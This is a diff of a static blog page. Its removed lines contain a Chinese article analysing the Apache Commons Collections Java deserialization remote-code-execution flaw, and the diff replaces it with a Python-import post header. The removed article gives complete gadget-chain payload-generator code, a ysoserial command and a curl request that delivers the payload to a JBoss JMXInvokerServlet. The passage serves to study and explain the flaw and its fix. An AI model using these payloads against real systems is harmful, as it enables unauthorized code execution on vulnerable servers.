@@ -118,7 +118,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/Django/" style="font-size: 10px;">Django</a> <a href="/tags/Genius-Bar/" style="font-size: 10px;">Genius Bar</a> <a href="/tags/MD5/" style="font-size: 10px;">MD5</a> <a href="/tags/Nginx/" style="font-size: 10px;">Nginx</a> <a href="/tags/PBKDF/" style="font-size: 10px;">PBKDF</a> <a href="/tags/PRF/" style="font-size: 10px;">PRF</a> <a href="/tags/R/" style="font-size: 10px;">R</a> <a href="/tags/RMBP13/" style="font-size: 10px;">RMBP13</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/uWSGI/" style="font-size: 10px;">uWSGI</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/密码学-论文/" style="font-size: 10px;">密码学 论文</a> <a href="/tags/性能/" style="font-size: 10px;">性能</a> <a href="/tags/涂层脱落/" style="font-size: 10px;">涂层脱落</a> <a href="/tags/算法/" style="font-size: 10px;">算法</a> <a href="/tags/统计学/" style="font-size: 10px;">统计学</a>
+						<a href="/tags/Django/" style="font-size: 10px;">Django</a> <a href="/tags/Genius-Bar/" style="font-size: 10px;">Genius Bar</a> <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/MD5/" style="font-size: 10px;">MD5</a> <a href="/tags/Nginx/" style="font-size: 10px;">Nginx</a> <a href="/tags/PBKDF/" style="font-size: 10px;">PBKDF</a> <a href="/tags/PRF/" style="font-size: 10px;">PRF</a> <a href="/tags/R/" style="font-size: 10px;">R</a> <a href="/tags/RMBP13/" style="font-size: 10px;">RMBP13</a> <a href="/tags/import/" style="font-size: 10px;">import</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/uWSGI/" style="font-size: 10px;">uWSGI</a> <a href="/tags/反序列化/" style="font-size: 10px;">反序列化</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/密码学-论文/" style="font-size: 10px;">密码学 论文</a> <a href="/tags/性能/" style="font-size: 10px;">性能</a> <a href="/tags/涂层脱落/" style="font-size: 10px;">涂层脱落</a> <a href="/tags/漏洞/" style="font-size: 10px;">漏洞</a> <a href="/tags/算法/" style="font-size: 10px;">算法</a> <a href="/tags/统计学/" style="font-size: 10px;">统计学</a>
 					</div>
 				</section>
 				
@@ -206,11 +206,11 @@
 
       <div class="body-wrap">
   
-    <article id="post-JAVA-反序列化漏洞利用分析" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-Python-import-问题" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/09/09/JAVA-反序列化漏洞利用分析/" class="article-date">
-  	<time datetime="2016-09-09T07:56:41.000Z" itemprop="datePublished">2016-09-09</time>
+      <a href="/2016/12/05/Python-import-问题/" class="article-date">
+  	<time datetime="2016-12-05T04:53:55.000Z" itemprop="datePublished">2016-12-05</time>
 </a>
     </div>
   
@@ -219,49 +219,101 @@
       <input type="hidden" class="isFancy" />
     
     
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/05/Python-import-问题/">Python import 问题</a>
+    </h1>
+  
+
+      </header>
+      
+    
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Java-反序列化任意代码执行漏洞分析与利用"><a href="#Java-反序列化任意代码执行漏洞分析与利用" class="headerlink" title="Java 反序列化任意代码执行漏洞分析与利用"></a>Java 反序列化任意代码执行漏洞分析与利用</h1><p>&#160; &#160; &#160; &#160;2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[<a href="#ref_3">3</a>]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。同年11月6日，FoxGlove Security安全团队的@breenmachine在一篇博客中介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。<br>距离漏洞发布已经有了一年多的时间，仍然有很多网站仍未修复漏洞。</p>
-<h2 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h2><h3 id="1-1-Java序列化与反序列化"><a href="#1-1-Java序列化与反序列化" class="headerlink" title="1.1 Java序列化与反序列化"></a>1.1 Java序列化与反序列化</h3><p>&#160; &#160; &#160; &#160;简单的说，把对象转换为字节序列的过程称为对象的序列化。把字节序列恢复为对象的过程称为对象的反序列化。</p>
-<p>&#160; &#160; &#160; &#160;Java序列化的目的是为了将某些对象存储到磁盘上，从而长期保存，例如最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。<br>或者当两个进程在进行远程通信时，彼此可以发送各种类型的数据。无论是何种类型的数据，都会以二进制序列的形式在网络上传送。发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。<br>一个序列化与反序列化的典型场景如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">public class deserial &#123;</span><br><span class="line">	public static void main(String args[]) throws Exception &#123;</span><br><span class="line">	    String obj = &quot;hello world!&quot;;</span><br><span class="line"></span><br><span class="line">	    // 将序列化对象写入文件object.db中</span><br><span class="line">	    FileOutputStream fos = new FileOutputStream(&quot;object.db&quot;);</span><br><span class="line">	    ObjectOutputStream os = new ObjectOutputStream(fos);</span><br><span class="line">	    os.writeObject(obj);</span><br><span class="line">	    os.close();</span><br><span class="line"></span><br><span class="line">	    // 从文件object.db中读取数据</span><br><span class="line">	    FileInputStream fis = new FileInputStream(&quot;object.db&quot;);</span><br><span class="line">	    ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">	    // 通过反序列化恢复对象obj</span><br><span class="line">	    String obj2 = (String)ois.readObject();</span><br><span class="line">	    System.out.println(obj2);</span><br><span class="line">	    ois.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="1-2Java-反序列化漏洞"><a href="#1-2Java-反序列化漏洞" class="headerlink" title="1.2Java 反序列化漏洞"></a>1.2Java 反序列化漏洞</h2><p>&#160; &#160; &#160; &#160;Java 反序列化漏洞的核心在于，由于Java中的类ObjectInputStream在反序列化时，没有对生成的对象的类型做限制。在反序列化的时候不需要指定原来的数据类型即可进行反序列化。如下代码仍可以执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">public class deserial &#123;</span><br><span class="line">	public static void main(String args[]) throws Exception &#123;</span><br><span class="line">	    String obj = &quot;hello world!&quot;;</span><br><span class="line">	    // 将序列化对象写入文件object.db中</span><br><span class="line">	    FileOutputStream fos = new FileOutputStream(&quot;object.db&quot;);</span><br><span class="line">	    ObjectOutputStream os = new ObjectOutputStream(fos);</span><br><span class="line">	    os.writeObject(obj);</span><br><span class="line">	    os.close();</span><br><span class="line">	    // 从文件object.db中读取数据</span><br><span class="line">	    FileInputStream fis = new FileInputStream(&quot;object.db&quot;);</span><br><span class="line">	    ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line">	    // 通过反序列化恢复对象obj</span><br><span class="line">	    Object obj2 = ois.readObject();</span><br><span class="line">	    System.out.println(obj2);</span><br><span class="line">	    ois.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>&#160; &#160; &#160; &#160;那么对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。</p>
-<p>&#160; &#160; &#160; &#160;反序列漏洞由来已久，PHP 和 Python 中也有同样的问题，而在 Java 中问题比较严重的原因是因为一些公用库，例如Apache Commons Collections中实现的一些类可以被反序列化用来实现任意代码执行。WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些应用的反序列化漏洞能够得以利用，就是依靠了Apache Commons Collections。<br>例如某些评论所说：<br><img src="http://i4.buimg.com/567571/e92c86dadfbb3033.png" alt="image"></p>
-<h2 id="1-3漏洞利用原理"><a href="#1-3漏洞利用原理" class="headerlink" title="1.3漏洞利用原理"></a>1.3漏洞利用原理</h2><p>&#160; &#160; &#160; &#160;该漏洞的出现的根源在CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法,并且该方法在相关对象反序列化时并未进行任何校验,新版本的修复方案对相关反射调用进行了限制。</p>
-<h3 id="1-3-1-InvokerTransformer-transform-实现程序执行"><a href="#1-3-1-InvokerTransformer-transform-实现程序执行" class="headerlink" title="1.3.1 InvokerTransformer.transform()实现程序执行"></a>1.3.1 InvokerTransformer.transform()实现程序执行</h3><p>&#160; &#160; &#160; &#160;问题函数主要出现在org.apache.commons.collections.Transformer,我们可以看到Transformer接口定义了一个方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public interface Transformer &#123;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Transforms the input object (leaving it unchanged) into some output object.</span><br><span class="line">     *</span><br><span class="line">     * @param input  the object to be transformed, should be left unchanged</span><br><span class="line">     * @return a transformed object</span><br><span class="line">     * @throws ClassCastException (runtime) if the input is the wrong class</span><br><span class="line">     * @throws IllegalArgumentException (runtime) if the input is invalid</span><br><span class="line">     * @throws FunctorException (runtime) if the transform cannot be completed</span><br><span class="line">     */</span><br><span class="line">    public Object transform(Object input);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>&#160; &#160; &#160; &#160;该接口的作用是给定一个 Object 进行 transform 变换后返回新的 Object，我们看它的实现类：<br><img src="http://i1.piimg.com/567571/08a0898c8e213f96.png" alt=""><br>&#160; &#160; &#160; &#160;其中接口的实现类InvokerTransformer的实现存在问题，我们看该类的transform 函数代码实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Transforms the input to result by invoking a method on the input.</span><br><span class="line"> *</span><br><span class="line"> * @param input  the input object to transform</span><br><span class="line"> * @return the transformed result, null if null input</span><br><span class="line"> */</span><br><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    if (input == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        return method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; catch (NoSuchMethodException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; does not exist&quot;);</span><br><span class="line">    &#125; catch (IllegalAccessException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; cannot be accessed&quot;);</span><br><span class="line">    &#125; catch (InvocationTargetException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; threw an exception&quot;, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>&#160; &#160; &#160; &#160;发现它可以用反射的方法进行函数调用input 对象的 iMethodName 函数，参数为 iArgs。同时可以看到它的这三个参数都是在构造函数中设置的，均为可控参数。</p>
-<h3 id="1-3-2-TransformedMap-checkSetValue-gt-InvokerTransformer-transform"><a href="#1-3-2-TransformedMap-checkSetValue-gt-InvokerTransformer-transform" class="headerlink" title="1.3.2 TransformedMap.checkSetValue()-&gt;InvokerTransformer.transform()"></a>1.3.2 TransformedMap.checkSetValue()-&gt;InvokerTransformer.transform()</h3><p>&#160; &#160; &#160; &#160;我们知道InvokerTransformer这个类的 transformer 函数可以用来执行任意代码，我们需要找调用这个函数的位置。<br><img src="http://i1.piimg.com/567571/d7a54e4d5e624445.png" alt=""><br>&#160; &#160; &#160; &#160;我们看到有很多类调用了这个函数，我们以 TransformedMap 为例子进行介绍。</p>
-<h3 id="1-3-3-MapEntry-setValue-gt-TransformedMap-checkSetValue"><a href="#1-3-3-MapEntry-setValue-gt-TransformedMap-checkSetValue" class="headerlink" title="1.3.3 MapEntry.setValue()-&gt;TransformedMap.checkSetValue()"></a>1.3.3 MapEntry.setValue()-&gt;TransformedMap.checkSetValue()</h3><p>&#160; &#160; &#160; &#160; 我们看TransformedMap.checkSetValue()的函数定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;.</span><br><span class="line"> *</span><br><span class="line"> * @param value  the value to transform</span><br><span class="line"> * @return the transformed value</span><br><span class="line"> * @since Commons Collections 3.1</span><br><span class="line"> */</span><br><span class="line">protected Object checkSetValue(Object value) &#123;</span><br><span class="line">		return valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>&#160; &#160; &#160; &#160; 我们在 eclipse 中查看它TransformedMap.checkSetValue()的调用栈发现它被MapEntry.setValue() 调用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Implementation of a map entry that checks additions via setValue.</span><br><span class="line"> */</span><br><span class="line">static class MapEntry extends AbstractMapEntryDecorator &#123;</span><br><span class="line"></span><br><span class="line">		/** The parent map */</span><br><span class="line">		private final AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">		protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;</span><br><span class="line">				super(entry);</span><br><span class="line">				this.parent = parent;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public Object setValue(Object value) &#123;</span><br><span class="line">				value = parent.checkSetValue(value);</span><br><span class="line">				return entry.setValue(value);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>&#160; &#160; &#160; &#160; 在MapEntry.setValue() 中对 parent 进行了 checkSetValue AbstractInputCheckedMapDecorator 类型的parent 是在构造函数中进行设置的。</p>
-<p>&#160; &#160; &#160; &#160; TransformedMap是AbstractInputCheckedMapDecorator 的一个子类，只要将 parent 设置为恶意的对象即可。</p>
-<p>&#160; &#160; &#160; &#160; 这样如果我们在序列化TransformedMap时指定了恶意的 InvokeTransformer 那么在MapEntry 执行 setValue 调用的时候，就会触发我们的 InvokeTransformer 中设置的恶意代码。<br>例如以下例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.Map.Entry;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">public class deserial &#123;</span><br><span class="line">	public static void main(String[] args) throws Exception &#123;</span><br><span class="line">	    Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">	        new ConstantTransformer(Runtime.class),</span><br><span class="line">	        new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">	            String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">	            &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">	        new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">	            Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">	            null, new Object[0] &#125;),</span><br><span class="line">	        new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;</span><br><span class="line">	            String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">	    Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">	    Map innerMap = new HashMap();</span><br><span class="line">	    innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">	    Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);</span><br><span class="line"></span><br><span class="line">	    Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">	    onlyElement.setValue(&quot;foobar&quot;);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h3 id="1-3-4-AnnotationInvocationHandler-readObject-gt-MapEntry-setValue"><a href="#1-3-4-AnnotationInvocationHandler-readObject-gt-MapEntry-setValue" class="headerlink" title="1.3.4 AnnotationInvocationHandler.readObject()-&gt;MapEntry.setValue()"></a>1.3.4 AnnotationInvocationHandler.readObject()-&gt;MapEntry.setValue()</h3><p>&#160; &#160; &#160; &#160; 但是目前的构造还需要依赖于触发Map中某一项去调用setValue()，我们需要想办法通过readObject()直接触发。<br>我们观察到java运行库中有这样一个类AnnotationInvocationHandler，这个类有一个成员变量memberValues是Map类型，同时它在 readObject 中对每一项 memberValue 都调用了 setValue，如下所示：</p>
-<p>&#160; &#160; &#160; &#160; 我们可以看到在 AnnotationInvocationHandler类的 readObject 函数中刚好有一个元素memberTypes，被调用了 setValue()方法，因此只需要构造一个  TransformedMap ，将它的 transformer 设置为 InvokeTransformer，然后将其用反射封装为一个AnnotationInvocationHandler类的对象。那么在反序列化在AnnotationInvocationHandler.readObject(xx)事就会触发漏洞,需要注意,这里的触发的类为AnnotationInvocationHandler。<br>生成 Payload 的一种方法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">public class deserial &#123;</span><br><span class="line">	public static void main(String[] args) throws Exception &#123;</span><br><span class="line">	    Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">	        new ConstantTransformer(Runtime.class),</span><br><span class="line">	        new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">	            String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">	            &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">	        new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">	            Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">	            null, new Object[0] &#125;),</span><br><span class="line">	        new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;</span><br><span class="line">	            String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">	    Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">	    Map&lt;String, String&gt; innerMap = new HashMap&lt;String, String&gt;();</span><br><span class="line">	    innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line"></span><br><span class="line">	    Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);</span><br><span class="line"></span><br><span class="line">	    Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">	    Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">	    ctor.setAccessible(true);</span><br><span class="line">	    Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line">	    File f = new File(&quot;payload.bin&quot;);</span><br><span class="line">	    ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">	    out.writeObject(instance);</span><br><span class="line">	    out.flush();</span><br><span class="line">	    out.close();</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h1 id="2-漏洞利用实例"><a href="#2-漏洞利用实例" class="headerlink" title="2.漏洞利用实例"></a>2.漏洞利用实例</h1><p>&#160; &#160; &#160; &#160; 针对 java 反序列化漏洞，国外有黑客已经写了开源的漏洞利用工具ysoserial<br>，国内也有大神根据该工具制作了 Jenkin 的利用工具。</p>
-<h2 id="2-1-Jenkins1-514漏洞利用"><a href="#2-1-Jenkins1-514漏洞利用" class="headerlink" title="2.1 Jenkins1.514漏洞利用"></a>2.1 Jenkins1.514漏洞利用</h2><p>&#160; &#160; &#160; &#160; 首先拿到一个Java应用，需要找到一个接受外部输入的序列化对象的接收点，即反序列化漏洞的触发点。我们可以通过审计源码中对反序列化函数的调用（例如readObject()）来寻找，也可以直接通过对应用交互流量进行抓包，查看流量中是否包含java序列化数据来判断，java序列化数据的特征为以标记（ac ed 00 05）开头。<br>确定了反序列化输入点后，再查看ClassPath 是否有 ApacheCommonsCollections 库<br>利用国内的漏洞利用工具利用</p>
-<p>&#160; &#160; &#160; &#160; 服务器报异常。</p>
-<p>&#160; &#160; &#160; &#160; 对于最新版本的2.7.3的 Jenkins则无法成功。</p>
-<h2 id="2-2-Jboss6-0-0-Final攻击"><a href="#2-2-Jboss6-0-0-Final攻击" class="headerlink" title="2.2 Jboss6.0.0.Final攻击"></a>2.2 Jboss6.0.0.Final攻击</h2><h3 id="2-2-1-生成-payload"><a href="#2-2-1-生成-payload" class="headerlink" title="2.2.1 生成 payload"></a>2.2.1 生成 payload</h3><p>&#160; &#160; &#160; &#160; 使用ysoserial生成 payload，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.4-all.jar CommonsCollections1 &apos;touch /tmp/hacked&apos; &gt; payload.bin</span><br></pre></td></tr></table></figure>
-<h3 id="2-2-2-用-curl-发送-payload："><a href="#2-2-2-用-curl-发送-payload：" class="headerlink" title="2.2.2 用 curl 发送 payload："></a>2.2.2 用 curl 发送 payload：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --header &apos;Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue&apos; --data-binary &apos;@payload.out&apos; http://127.0.0.1:8080/invoker/JMXInvokerServlet</span><br></pre></td></tr></table></figure>
-<p><img src="http://i1.piimg.com/567571/8122b74dfda459f6.png" alt=""></p>
-<p>&#160; &#160; &#160; &#160;可以看到<code>/tmp/hacked</code> 被创建<br><img src="http://i1.piimg.com/567571/7154118dfaf01543.png" alt=""><br>&#160; &#160; &#160; &#160;但是目前存在的问题是其他有的指令无法执行。</p>
-<h1 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h1><p>&#160; &#160; &#160; &#160; ApacheCommonsCollections在3.2.2中修复了漏洞。对这些不安全的Java类的序列化支持增加了开关，默认为关闭状态。涉及的类包括<code>CloneTransformer,ForClosure, InstantiateFactory, InstantiateTransformer, InvokerTransformer, PrototypeCloneFactory,PrototypeSerializationFactory, WhileClosure</code>。</p>
-<p>&#160; &#160; &#160; &#160;例如 InvokerTransformer 中，如果对该对象序列化，则会报异常。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Overrides the default writeObject implementation to prevent</span><br><span class="line"> * serialization (see COLLECTIONS-580).</span><br><span class="line"> */</span><br><span class="line">private void writeObject(ObjectOutputStream os) throws IOException &#123;</span><br><span class="line">		FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);</span><br><span class="line">		os.defaultWriteObject();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Overrides the default readObject implementation to prevent</span><br><span class="line"> * de-serialization (see COLLECTIONS-580).</span><br><span class="line"> */</span><br><span class="line">private void readObject(ObjectInputStream is) throws ClassNotFoundException, IOException &#123;</span><br><span class="line">		FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);</span><br><span 